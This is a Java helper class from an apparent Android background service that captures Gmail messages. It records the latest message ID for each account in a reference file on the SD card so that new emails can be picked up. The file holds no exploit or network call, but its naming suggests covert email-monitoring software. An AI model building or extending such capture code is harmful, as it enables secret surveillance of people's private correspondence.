package com.vvt.daemon.email;

import java.io.File;
import java.util.HashMap;
import java.util.HashSet;

import com.vvt.dbobserver.WriteReadFile;
import com.vvt.logger.FxLog;

public class GmailCapturingHelper {
	
	private static final String TAG = "GmailCapturingHelper";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	
	static final String DEFAULT_DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	static final String DEFAULT_PATH = "/sdcard/data/data/com.vvt.im";
	static final String LOG_FILE_NAME = "gmail.ref";
	
	/**
	 * Construct reference ID for each Gmail account
	 * @param loggablePath
	 * @return list of Gmail accounts
	 */
	public static void initializeRefIds(HashSet<String> accounts, String loggablePath) {
		if(LOGV) FxLog.v(TAG, "initializeRefIds # ENTER ...");
		
		// Initialize HashMap
		HashMap<String, Long> refIds = new HashMap<String, Long>();
		
		if (accounts.size() > 0) {
			// Collect latest conversation for each account
			long refId = 0;
			for (String account : accounts) {
				refId = GmailDatabaseManager.getMessageLatestId(account);
				refIds.put(account, refId);
				
				if(LOGD) FxLog.d(TAG, String.format(
						"initializeRefIds # %s=%d", account, refId));
			}
			
			// Update information in database
			String dataRefIds = convertToString(refIds);
			writeToFile(loggablePath, dataRefIds);
		}
		else {
			if(LOGD) FxLog.d(TAG, "initializeRefIds # No account found");
		}
		
		if(LOGV) FxLog.v(TAG, "initializeRefIds # EXIT ...");
	}
	
	public static void updateRefId(String account, long refId, String loggablePath) {
		if(LOGV) FxLog.v(TAG, "updateRefId # ENTER ...");
		if(LOGD) FxLog.d(TAG, String.format(
					"updateRefId # account=%s, refId=%d", account, refId));
		
		// Get refIds as Map
		HashMap<String, Long> refIds = getRefIds(loggablePath);
		
		// Update refId for specific account
		refIds.put(account, refId);
		
		// Write it back
		writeToFile(loggablePath, convertToString(refIds));
		if(LOGV) FxLog.v(TAG, "updateRefId # EXIT ...");
	}
	
	public static long getRefId(String account, String loggablePath) {
		HashMap<String, Long> refIds = getRefIds(loggablePath);
		return refIds.containsKey(account) ? refIds.get(account) : -1;
	}
	
	private static HashMap<String, Long> getRefIds(String loggablePath) {
		if (loggablePath == null) {
			loggablePath = DEFAULT_PATH;
		}
		String dataRefIds = WriteReadFile.readFile(
				String.format("%s/%s", loggablePath, LOG_FILE_NAME));
		
		HashMap<String, Long> refDates = new HashMap<String, Long>();
		if (dataRefIds != null) {
			String[] restoreArray = dataRefIds.split(", ");
			String[] temp;
			for (String item : restoreArray) {
				temp = item.split("=");
				if (temp.length > 1) {
					refDates.put(temp[0], Long.parseLong(temp[1]));
				}
			}
			if(LOGV) FxLog.v(TAG, String.format("getStringAsMap # refDates: %s", refDates));
		}
		return refDates;
	}
	
	private static String convertToString(HashMap<String, Long> refIds) {
		if (refIds == null) {
			return null;
		}
		String refDatesString = refIds.toString();
		return refDatesString.substring(1, refDatesString.length() -1);
	}

	private static void writeToFile(String loggablePath, String dataRefIds) {
		if (loggablePath == null) {
			loggablePath = DEFAULT_PATH;
		}
		
		String fullPath = String.format(loggablePath);
		File f = new File(fullPath);
		if (!f.exists()) {
			f.mkdirs();
		}
		WriteReadFile.writeFile(
				String.format("%s/%s", loggablePath, LOG_FILE_NAME), dataRefIds);
	}
	
}
